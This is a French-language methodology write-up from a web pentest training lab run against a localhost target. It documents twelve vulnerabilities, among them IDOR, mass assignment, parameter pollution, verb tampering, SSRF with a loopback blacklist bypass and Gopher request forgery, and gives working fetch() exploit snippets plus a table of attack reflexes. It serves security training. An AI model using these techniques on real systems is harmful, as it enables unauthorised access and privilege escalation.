# Méthodologie — Lab Decima Technologies / Samaritan OS (IDOR & Contrôle d'Accès)

**Type d'engagement :** Grey Box Penetration Test
**Cible :** Samaritan Core Interface (mesh network, nodes opérationnels)
**Compte de départ :** `H_BURROW` (ANALYST, ID 20)
**Objectif :** Vérifier l'isolation entre nodes et l'impossibilité d'escalade de privilèges vers le niveau "Overseer"

**Outillage :** l'intégralité de l'audit a été menée depuis le navigateur (Chrome/Edge), sans outil externe (pas de Burp Suite, pas de curl en ligne de commande, pas d'exiftool). Deux surfaces ont suffi :
- **Barre d'adresse** pour les tests GET rapides et l'observation directe des réponses
- **DevTools → Console** pour toutes les requêtes `fetch()` personnalisées (POST, headers custom, payloads JSON), ainsi que pour l'inspection de fichiers binaires (lecture de métadonnées PNG via `ArrayBuffer`/`TextDecoder`)
- **DevTools → Network / Elements** pour la capture des requêtes, l'analyse des headers de réponse et l'édition live du DOM (suppression d'attributs `readonly`)

Chrome bloque le collage direct dans la console (anti self-XSS) : taper `allow pasting` puis Entrée avant de coller un bloc de code est nécessaire à chaque nouvelle session de console.

---

## Résumé exécutif

12 vulnérabilités identifiées et exploitées, couvrant 4 grandes familles :
- **Contrôle d'accès brisé (IDOR)** — 4 occurrences, sur des vecteurs différents (paramètre URL, asset statique, header custom)
- **Validation d'entrée insuffisante côté serveur** — 3 occurrences (mass assignment, HTTP Parameter Pollution, verb tampering)
- **Exposition d'information** — 2 occurrences (encodage réversible pris pour du chiffrement, fuite d'endpoints internes)
- **SSRF (Server-Side Request Forgery)** — 2 occurrences, incluant un contournement de blacklist et une forge de requête HTTP via le protocole Gopher

**Constat transversal :** la quasi-totalité des restrictions observées sont appliquées côté client (JavaScript, attributs HTML `readonly`) ou reposent sur une simple validation d'existence de ressource, sans vérification d'autorisation réelle côté serveur. C'est le pattern dominant de tout le mesh network Samaritan.

---

## Méthodologie générale appliquée

1. **Cartographie de l'attack surface** : connexion, exploration de l'interface, ouverture systématique des DevTools (onglets Network, Elements, Console) dès la première page.
2. **Lecture du code source complet** (`Ctrl+U`) plutôt que l'inspection ponctuelle — un unique passage sur le HTML/JS a révélé la totalité des endpoints, noms de paramètres exacts (`aid` au lieu de `id`), champs cachés (`user_id`), et fonctions JS exposant des routes non liées dans le menu (`/admin/control`).
3. **Différenciation des messages d'erreur** comme signal de progression (`404` → `401` → `403` → succès) plutôt que recherche binaire aveugle.
4. **Triangulation entre challenges** : les prérequis explicites entre étapes (badges → node ID → header d'autorisation) imposaient de conserver toute donnée collectée, même en apparence anodine (ex : métadonnées PNG).
5. **Recours au hint après épuisement des hypothèses raisonnables**, jamais en premier réflexe — cohérent avec la charte du lab.

---

## Détail des vulnérabilités

### 1. IDOR — Paramètre `aid` sur le profil personnel
**Endpoint :** `GET /interface/profile?aid=<id>`
**Constat :** le paramètre `aid` n'est jamais vérifié par rapport à la session active. N'importe quel ID renvoie la fiche complète de l'utilisateur correspondant.
**Méthode de découverte :** le nom réel du paramètre (`aid`, et non `id`/`user_id`/`uid` testés initialement) n'était visible que dans le code source complet (`href="/interface/profile?aid=20"`), pas dans l'URL affichée par défaut (session-based).

**Commande (barre d'adresse) :**
```
http://localhost:5000/interface/profile?aid=1
http://localhost:5000/interface/profile?aid=21
```

**Impact :** divulgation de données personnelles (codename, désignation, email, bio) de tout agent, sans authentification différenciée.

### 2. IDOR — Assets statiques (badges)
**Endpoint :** `GET /static/badges/badge_<id>.png`
**Constat :** même faille que #1, appliquée aux fichiers statiques. Aucune vérification que le badge demandé appartient à l'utilisateur courant.
**Bonus technique :** les fichiers PNG contenaient des métadonnées textuelles en clair, lisibles par simple décodage `TextDecoder` sur l'`ArrayBuffer` — sans outil externe type exiftool. Cette fuite a été réutilisée comme prérequis du Challenge 9 (récupération du node du compte DIRECTOR).

**Commande (console) :**
```js
fetch('/static/badges/badge_1.png')
    .then(r => r.arrayBuffer())
    .then(buf => {
        const text = new TextDecoder('utf-8', { fatal: false }).decode(buf);
        const matches = text.match(/[\x20-\x7E]{6,}/g);
        console.log(matches ? matches.join('\n') : 'no readable strings found');
    });
```

**Impact :** exposition d'assets sensibles et de métadonnées internes (node d'affectation) pour tout utilisateur du système.

### 3. Contrôle de fraîcheur appliqué côté client uniquement
**Endpoint :** `GET /logs/audio/<date>`
**Constat :** l'interface affichait une restriction "archives > 24h inaccessibles", mais ce filtre n'existait que dans le JavaScript front-end (`fetchLog()`). Un appel direct à l'API avec la date exacte du dernier crash système (visible en pied de page : `2024-01-01`) contournait totalement la restriction.

**Commande (barre d'adresse) :**
```
http://localhost:5000/logs/audio/2024-01-01
```

**Impact :** accès à des données historiques censées être protégées par une politique de rétention.

### 4. Mass assignment via champ formulaire caché/verrouillé côté client
**Endpoint :** `POST /update_status`
**Constat :** le champ `role` du formulaire était marqué `readonly` en HTML — protection purement visuelle. L'envoi direct de la requête via `fetch()` contournait cette protection sans même avoir besoin d'éditer le DOM. La valeur `OVERSEER` était rejetée silencieusement (validation partielle non documentée), mais `ADMIN` était acceptée sans contrôle.
**Point méthodologique :** un rejet silencieux (pas d'erreur, mais pas d'effet) est un signal à ne pas confondre avec "endpoint non exploitable" — il indique une validation existante mais incomplète, qu'il faut cartographier valeur par valeur.

**Commande (console) :**
```js
fetch('/update_status', {
    method: 'POST',
    body: new URLSearchParams({ mood: 'STABLE', role: 'ADMIN' })
})
.then(r => r.text())
.then(t => console.log(t));
```

**Impact :** élévation de privilèges via manipulation d'un champ non protégé côté serveur.

### 5. HTTP Parameter Pollution (HPP)
**Endpoint :** `POST /ticket/create`
**Constat :** l'envoi d'un `user_id` unique différent du sien déclenchait un contrôle explicite ("ID MISMATCH"). L'envoi du **même paramètre en double** contournait ce contrôle : le serveur valide vraisemblablement la première occurrence mais utilise la dernière pour l'action réelle — un désaccord classique entre couche de validation et couche métier dans le parsing des paramètres dupliqués.

**Commande (console) :**
```js
fetch('/ticket/create', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'user_id=20&user_id=1&message=test+anomaly+report'
})
.then(r => r.text())
.then(t => console.log(t));
```

**Impact :** création de ressources (tickets) au nom d'un autre utilisateur malgré un contrôle d'identité apparent.

### 6. Encodage confondu avec du chiffrement
**Endpoint :** `GET /intel/download/<hash>`
**Constat :** le "hash" affiché (`dXNlcl8yMA==`) était en réalité du Base64 trivial, décodable en clair (`user_20`). Le pattern `user_<id>` étant déductible, il suffisait d'encoder `user_<autre_id>` pour télécharger le manuel confidentiel de n'importe quel agent.
**Impact secondaire :** ce manuel exposait lui-même un endpoint interne non documenté (`POST /api/v2/promote`), utilisé pour l'exploitation du Challenge 8 — illustration d'un effet de cascade où une fuite d'information de faible sévérité alimente une vulnérabilité critique en aval.

**Commandes (console) :**
```js
// Décodage du format
console.log(atob('dXNlcl8yMA=='));  // -> user_20

// Encodage d'un ID cible et téléchargement
const target = btoa('user_1');
fetch('/intel/download/' + target)
    .then(r => r.text())
    .then(t => console.log(t));
```

**Impact :** divulgation de documentation confidentielle et fuite d'endpoint interne critique.

### 7. HTTP Verb Tampering
**Endpoint :** `/logs/sys/555`
**Constat :** la méthode `GET` déclenchait un message de restriction. Une requête `OPTIONS` a révélé les méthodes réellement acceptées par la route (header `Allow: OPTIONS, HEAD, GET, DELETE`) — `DELETE` n'était soumis à aucun contrôle d'accès et retournait le contenu protégé.
**Point méthodologique :** systématiser une requête `OPTIONS` sur toute route protégée fait partie des premiers réflexes à avoir — le header `Allow` liste souvent des méthodes non prévues par les développeurs pour un usage "lecture", révélant des incohérences de contrôle d'accès par verbe.

**Commandes (console) :**
```js
// Reconnaissance des verbes acceptés
fetch('/logs/sys/555', { method: 'OPTIONS' })
    .then(r => console.log('Allow:', r.headers.get('Allow')));

// Exploitation
fetch('/logs/sys/555', { method: 'DELETE' })
    .then(r => r.text())
    .then(t => console.log(t));
```

**Impact :** contournement total d'une restriction d'accès en changeant simplement le verbe HTTP.

### 8. Endpoint d'administration sans autorisation ("Blind" endpoint)
**Endpoint :** `POST /api/v2/promote`
**Constat :** endpoint non lié dans l'interface, découvert via la fuite d'information du Challenge 6. Aucune vérification d'autorisation n'était appliquée : un appel POST vide suffisait à obtenir une élévation de privilèges pour le compte courant.

**Commande (console) :**
```js
fetch('/api/v2/promote', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({})
})
.then(r => r.text())
.then(t => console.log(t));
```

**Impact :** élévation de privilèges arbitraire, sans même nécessiter de connaître un rôle cible valide.

### 9. IDOR via header HTTP personnalisé
**Endpoint :** `GET /admin/control` (header `X-Decima-Node`)
**Constat :** l'autorisation d'une action critique (shutdown) reposait sur la valeur d'un header custom identifiant le node source, sans lien avec l'authentification de session. Le node légitime autorisé (`NODE-314`, appartenant au compte DIRECTOR) a été retrouvé dans les métadonnées du badge de cet utilisateur (cf. #2), permettant l'usurpation du header.

**Commande (console) :**
```js
fetch('/admin/control', {
    method: 'GET',
    headers: { 'X-Decima-Node': 'NODE-314' }
})
.then(r => r.text())
.then(t => console.log(t));
```

**Impact :** exécution d'une action administrative critique en falsifiant un identifiant de confiance transmis côté client.

### 10. SSRF vers un service interne + bypass d'autorisation
**Endpoint :** `POST /net/uptime` (`{"url": "..."}`)
**Constat :** l'outil de diagnostic effectue une requête serveur-side arbitraire vers l'URL fournie. La sortie par défaut (statut Apache) révélait elle-même l'existence d'un service de métriques interne non exposé publiquement (`localhost:8001/metrics`, commentaire "Internal Only"). Ce service exigeait un paramètre `node`, qui rejetait les formats invalides jusqu'à l'utilisation du node autorisé déjà identifié (`NODE-314`).

**Commandes (console) :**
```js
// Reconnaissance : révèle le service interne caché
fetch('/net/uptime', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: 'http://127.0.0.1:5000/server-status' })
})
.then(r => r.text())
.then(t => console.log(t));

// Pivot vers le service interne + bypass du contrôle "node"
fetch('/net/uptime', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: 'http://localhost:8001/metrics?node=NODE-314' })
})
.then(r => r.text())
.then(t => console.log(t));
```

**Impact :** pivot réseau vers un service interne théoriquement inaccessible depuis l'extérieur, avec contournement de son propre contrôle d'autorisation.

### 11. SSRF avec bypass de blacklist + forge de requête HTTP (protocole Gopher)
**Endpoint :** `POST /net/scraper` (`{"url": "..."}`)
**Constat en deux temps :**
- La blacklist de loopback (`127.0.0.1`, `localhost`) était contournée par la représentation alternative `0.0.0.0`, équivalente réseau mais absente du filtre textuel.
- Le service cible exigeait un `User-Agent` précis (`DecimaBot/1.0`), non modifiable via les champs JSON exposés par l'API. Le protocole **Gopher** (`gopher://host:port/_<requête_HTTP_brute_encodée>`) a permis de forger une requête HTTP complète, headers inclus, exploitée nativement par `curl` en arrière-plan.
**Point méthodologique :** face à un outil SSRF qui ne permet de contrôler qu'une URL sans en-têtes, le protocole Gopher est le vecteur de référence pour injecter des données brutes (requêtes HTTP, commandes Redis/Memcached, etc.) dans un flux TCP arbitraire.

**Commande (console) :**
```js
const rawRequest = "GET /internal/reward HTTP/1.1\r\nHost: 0.0.0.0:5000\r\nUser-Agent: DecimaBot/1.0\r\n\r\n";
const gopherUrl = "gopher://0.0.0.0:5000/_" + encodeURIComponent(rawRequest);

fetch('/net/scraper', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: gopherUrl })
})
.then(r => r.text())
.then(t => console.log(t));
```

**Impact :** exfiltration de données internes en contournant simultanément un filtre réseau et un contrôle applicatif (validation de header).

### Bonus — Endpoint caché non lié dans l'interface
**Endpoint :** `GET /interface/core`
**Constat :** page complètement absente du menu de navigation, découverte par brute-force manuel de chemins probables sans dépendance aux challenges précédents.

**Commande (barre d'adresse) :**
```
http://localhost:5000/interface/core
```

---

## Enseignements méthodologiques réutilisables

| Symptôme observé | Signification probable | Action réflexe |
|---|---|---|
| Un champ de formulaire est visuellement verrouillé (`readonly`, `disabled`) | Protection cosmétique uniquement | Tester l'envoi direct de la requête sans passer par le formulaire |
| Le message d'erreur change entre deux tentatives (404 → 401 → 403 → 200) | Progression réelle, pas un mur fixe | Continuer d'itérer sur cette piste plutôt que d'en changer |
| Une réponse mentionne un service, port ou chemin "interne" | Fuite d'information exploitable en SSRF | Tenter un accès direct à ce service via l'outil de requête serveur disponible |
| Une donnée ressemble à du Base64 (padding `=`, alphabet restreint) | Encodage réversible, pas un secret | Décoder systématiquement avant d'aller plus loin |
| Un même paramètre semble "vérifié puis utilisé" à deux endroits différents | Candidat naturel au HTTP Parameter Pollution | Tester la duplication du paramètre avec deux valeurs différentes |
| Une route rejette un verbe HTTP avec un message générique | Le contrôle d'accès n'est peut-être appliqué qu'à ce verbe précis | Envoyer une requête `OPTIONS` pour lister les verbes réellement acceptés |
| Un outil "fetch URL" ne permet pas de modifier les en-têtes HTTP | Piste SSRF via forge de requête | Envisager le protocole `gopher://` pour injecter une requête brute |
| Une blacklist bloque `127.0.0.1` / `localhost` | Filtre textuel, pas réseau | Tester les représentations alternatives (`0.0.0.0`, décimal, octal, IPv6) |

---

*Document produit dans le cadre du module Jedha Cyber Lead — Pentest Web (Grey Box), Samaritan Core Interface. À intégrer à la bibliothèque de méthodologie personnelle (HIVE).*
